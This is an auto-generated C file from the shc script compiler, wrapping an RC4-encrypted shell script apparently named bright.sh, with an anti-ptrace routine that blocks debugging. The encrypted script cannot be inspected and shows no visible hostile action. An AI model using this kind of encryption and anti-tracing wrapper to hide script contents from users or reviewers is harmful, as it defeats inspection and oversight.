#if 0
	shc Version 3.8.7, Generic Script Compiler
	Copyright (c) 1994-2009 Francisco Rosales <frosal@fi.upm.es>

	./shc -f ../bright.sh 
#endif

static  char data [] = 
#define      lsto_z	1
#define      lsto	((&data[0]))
	"\202"
#define      msg1_z	42
#define      msg1	((&data[1]))
	"\320\115\067\205\214\131\201\106\316\005\016\314\040\145\171\053"
	"\252\347\157\333\031\333\200\223\363\050\354\006\331\063\151\021"
	"\141\002\314\322\376\376\210\142\113\050\333\213\371\171\075\155"
	"\365\032"
#define      xecc_z	15
#define      xecc	((&data[54]))
	"\305\044\111\372\310\310\174\322\203\160\033\073\330\173\344\143"
	"\016\067"
#define      msg2_z	19
#define      msg2	((&data[69]))
	"\221\112\126\246\220\375\314\364\353\136\113\126\034\166\057\253"
	"\143\032\122\041"
#define      text_z	112
#define      text	((&data[105]))
	"\003\345\173\212\117\160\145\152\203\040\106\017\032\277\115\207"
	"\332\173\165\224\372\212\103\047\130\225\037\346\051\371\124\220"
	"\232\313\237\133\362\315\006\204\132\147\171\055\025\174\025\317"
	"\312\151\343\230\255\246\235\061\066\020\162\343\254\354\040\365"
	"\243\252\162\326\347\112\022\331\323\112\313\160\362\256\304\351"
	"\322\207\063\370\266\027\215\250\335\137\113\227\323\000\045\171"
	"\135\313\011\111\367\365\151\135\006\150\245\120\032\350\244\354"
	"\052\322\260\313\322\166\042\034\271\013\265\110\033\047\152\143"
	"\264\147\340"
#define      tst1_z	22
#define      tst1	((&data[223]))
	"\232\346\115\026\222\152\230\233\151\025\125\240\345\200\147\067"
	"\051\036\316\250\151\244\311\111\252\266\051\156"
#define      chk1_z	22
#define      chk1	((&data[252]))
	"\212\242\012\024\274\135\367\027\365\231\341\003\300\331\212\072"
	"\074\063\054\137\024\314\344\306\304\232\362\172\171"
#define      rlax_z	1
#define      rlax	((&data[277]))
	"\201"
#define      opts_z	1
#define      opts	((&data[278]))
	"\066"
#define      tst2_z	19
#define      tst2	((&data[280]))
	"\027\267\141\111\054\227\064\017\072\174\320\107\100\326\364\247"
	"\261\106\242\311\302"
#define      date_z	1
#define      date	((&data[300]))
	"\361"
#define      chk2_z	19
#define      chk2	((&data[301]))
	"\074\237\330\135\156\034\022\167\337\236\223\323\273\200\365\341"
	"\340\216\352\020"
#define      pswd_z	256
#define      pswd	((&data[349]))
	"\145\053\015\357\316\027\004\300\222\175\035\221\030\300\237\314"
	"\042\372\010\072\275\045\307\034\351\357\141\371\312\356\224\214"
	"\162\355\040\242\135\151\244\117\320\225\170\004\376\015\023\046"
	"\033\173\243\136\213\170\172\025\230\313\361\143\272\205\360\055"
	"\163\020\320\321\171\164\040\112\012\230\116\010\246\142\056\301"
	"\335\321\040\151\111\232\176\342\146\157\105\041\365\065\117\150"
	"\105\037\072\277\224\133\012\237\364\131\247\232\273\325\133\230"
	"\247\174\001\360\026\177\323\175\356\031\236\344\116\356\115\224"
	"\016\207\124\243\342\137\102\326\270\351\160\163\276\314\013\146"
	"\111\015\127\137\215\052\335\174\103\174\140\222\152\255\047\170"
	"\064\174\033\027\333\135\356\223\106\137\006\005\054\022\154\165"
	"\040\303\325\255\355\262\051\061\056\212\304\231\067\354\021\154"
	"\150\055\204\104\212\162\327\321\321\336\327\375\361\103\163\021"
	"\006\110\277\364\372\350\046\051\162\352\302\252\326\324\026\077"
	"\001\232\203\213\015\132\135\337\071\065\334\052\170\120\074\177"
	"\230\373\164\223\344\232\274\127\204\177\001\133\123\027\232\124"
	"\262\035\340\277\170\076\236\262\163\173\335\354\313\031\154\144"
	"\025\340\367\371\172\264\120\377\063\121\132\206\315\320\170\062"
	"\373\206\042\312\235\046\213\060\244\250\301\274\150\141\211\213"
	"\133\222\306\031\267\215\065\240\174\227\232\112"
#define      shll_z	10
#define      shll	((&data[637]))
	"\256\244\276\224\027\204\203\141\156\364\142"
#define      inlo_z	3
#define      inlo	((&data[648]))
	"\361\203\355"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		if (text_z < hide_z) {
			/* Prepend spaces til a hide_z script size. */
			scrpt = malloc(hide_z);
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', hide_z);
			memcpy(&scrpt[hide_z - text_z], text, text_z);
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, argv[0]);
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
